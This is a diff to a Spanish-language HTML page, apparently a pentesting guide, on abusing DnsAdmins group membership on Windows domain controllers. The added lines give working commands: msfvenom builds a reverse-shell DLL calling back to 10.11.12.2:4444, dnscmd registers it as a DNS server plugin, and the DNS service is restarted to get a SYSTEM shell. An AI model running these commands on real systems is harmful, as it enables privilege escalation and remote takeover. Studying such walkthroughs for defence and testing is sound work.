@@ -2,9 +2,12 @@
 
 <h3>◍ Explicación</h3>
 <p class="mainText">
-    Los miembros del grupo “DnsAdmins” tienen acceso a la información de DNS de la red. Los permisos asociados a este grupo de forma predeterminada 
+    Los miembros del grupo <b>DnsAdmins</b> tienen acceso a la información de DNS de la red. Los permisos asociados a este grupo de forma predeterminada 
     son poder leer, escribir, crear y eliminar objetos secundarios. Generalmente este grupo solo existe si el rol de servidor DNS está o estuvo 
-    instalado en un controlador de dominio.
+    instalado en un controlador de dominio. 
+    <a class="linksref" target="_blank" href="https://learn.microsoft.com/es-es/windows-server/identity/ad-ds/manage/understand-security-groups#dnsadmins">
+        <i class="bi bi-box-arrow-up-right"></i>
+    </a>
 </p>
 
 <h3>◍ Ataque</h3>
@@ -13,3 +16,60 @@
     configuración en el registro del servicio DNS de forma que se puede cargar un Plugin con extensión DLL que se cargará al iniciarse el servicio. 
     Un atacante podría hacer referencia en esa configuración a un fichero DLL malicioso y de esa forma conseguir ejecución en la máquina como SYSTEM.
 </p>
+
+<!-- Code snipet-->
+<p class="mainComment">
+    Creamos primero una dll maliciosa con msfvenom con el siguiente código:
+</p>
+<div class="snipet_custom position-relative">
+<pre class="code_snipet"><code data-language="shell">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.12.2 LPORT=4444 -f dll -o rev.dll
+</code></pre>
+</div>
+<!-- Code-->
+
+
+<!-- Code snipet-->
+<p class="mainComment">
+    Realizamos la configuración del servicio DNS añadiendo la referencia del plugin a nuestra DLL con la shell reversa:
+</p>
+<div class="snipet_custom position-relative">
+<pre class="code_snipet"><code data-language="shell">dnscmd.exe /config /serverlevelplugindll C:\Users\User\rev.dll
+</code></pre>
+</div>
+<!-- Code-->
+
+
+<!-- Code snipet-->
+<p class="mainComment">
+    Y finalmente reiniciamos el servicio para que se ejecute al caragar la DLL.
+</p>
+<div class="snipet_custom position-relative">
+<pre class="code_snipet"><code data-language="shell">sc stop dns
+sc start dns
+</code></pre>
+</div>
+<!-- Code-->
+
+
+
+<!-- 
+    ---------------------------- EJEMPLO ------------------------------------------------
+-->
+
+<h2 class="h_ejemplo"><i class="bi bi-bug-fill me-2"></i></i>EJEMPLO</h2>
+<p>
+    Primero comprobamos que pertenecemos al grupo <b>DnsAdmins</b>. Al listar los privilegios no tendrá ninguno especial 
+    solamente es necesario que pertenezca a este grupo.
+</p>
+<p>
+    Creamos la shell reversa y configuramos el servicio DNS apuntando hacia esta.
+</p>
+<img class="img img-fluid imag_ejemplos mb-3" src="./media/imag/groups/dnsAdmin_1.png" />
+<p>
+    Reiniciamos el servicio DNS.
+</p>
+<img class="img img-fluid imag_ejemplos mb-3" src="./media/imag/groups/dnsAdmin_2.png" />
+<p>
+    Inmediatamente se inicia la conexión reversa como SYSTEM.
+</p>
+<img class="img img-fluid imag_ejemplos mb-3" src="./media/imag/groups/dnsAdmin_3.png" />
